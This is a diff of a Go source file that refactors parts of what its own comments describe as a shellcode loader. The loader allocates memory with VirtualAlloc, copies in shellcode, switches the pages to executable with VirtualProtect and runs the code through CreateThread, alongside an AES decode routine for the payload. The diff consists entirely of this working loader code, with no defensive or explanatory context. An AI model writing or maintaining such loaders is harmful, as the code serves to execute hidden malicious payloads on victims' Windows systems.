@@ -106,9 +106,8 @@ func aesDecode(data, key []byte) []byte {
 // mapMemory allocates a private RW region, copies the shellcode into it and
 // flips the page protection to RX. Returns the base address, or 0 on failure.
 func mapMemory(data []byte) uintptr {
-	addr, _, _ := syscall.Syscall6(
-		procVirtualAlloc.Addr(), 4,
-		0, uintptr(len(data)), memReserve|memCommit, pageRW, 0, 0,
+	addr, _, _ := syscall.SyscallN(
+		procVirtualAlloc.Addr(), 0, uintptr(len(data)), memReserve|memCommit, pageRW, 0, 0,
 	)
 	if addr == 0 {
 		return 0
@@ -119,9 +118,8 @@ func mapMemory(data []byte) uintptr {
 		uintptr(len(data)),
 	)
 	var old uint32
-	ok, _, _ := syscall.Syscall6(
-		procVirtualProtect.Addr(), 4,
-		addr, uintptr(len(data)), pageRX, uintptr(unsafe.Pointer(&old)), 0, 0,
+	ok, _, _ := syscall.SyscallN(
+		procVirtualProtect.Addr(), addr, uintptr(len(data)), pageRX, uintptr(unsafe.Pointer(&old)), 0, 0,
 	)
 	if ok == 0 {
 		return 0
@@ -137,9 +135,8 @@ func runSynchronous(data []byte) {
 		return
 	}
 	var threadID uint32
-	thread, _, _ := syscall.Syscall6(
-		procCreateThread.Addr(), 6,
-		0, 0, start, 0, 0, uintptr(unsafe.Pointer(&threadID)),
+	thread, _, _ := syscall.SyscallN(
+		procCreateThread.Addr(), 0, 0, start, 0, 0, uintptr(unsafe.Pointer(&threadID)),
 	)
 	if thread == 0 {
 		return
@@ -157,9 +154,8 @@ func startThread(data []byte) uintptr {
 		return 0
 	}
 	var threadID uint32
-	thread, _, _ := syscall.Syscall6(
-		procCreateThread.Addr(), 6,
-		0, 0, start, 0, 0, uintptr(unsafe.Pointer(&threadID)),
+	thread, _, _ := syscall.SyscallN(
+		procCreateThread.Addr(), 0, 0, start, 0, 0, uintptr(unsafe.Pointer(&threadID)),
 	)
 	return thread
 }
